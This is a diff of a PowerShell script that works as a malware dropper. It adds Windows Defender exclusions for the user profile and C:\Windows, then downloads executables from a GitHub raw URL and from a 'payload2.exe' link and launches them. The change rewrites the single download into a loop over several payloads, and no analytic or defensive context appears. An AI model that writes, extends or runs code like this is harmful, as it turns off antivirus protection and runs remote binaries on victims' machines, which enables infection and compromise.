@@ -1,6 +1,12 @@
 Add-MpPreference -ExclusionPath $env:USERPROFILE
 Add-MpPreference -ExclusionPath C:\Windows
-$url = "https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/Disk.exe"
-$output = "$env:Fix.exe"
-Invoke-WebRequest -Uri $url -OutFile $output
-Start-Process -FilePath $output
+$urls = @(
+    "https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/Disk.exe",
+    "https://example.com/payload2.exe"
+)
+foreach ($url in $urls) {
+    $fileName = Split-Path $url -Leaf
+    $output = "$env:USERPROFILE\$fileName"
+    Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing
+    Start-Process -FilePath $output
+}
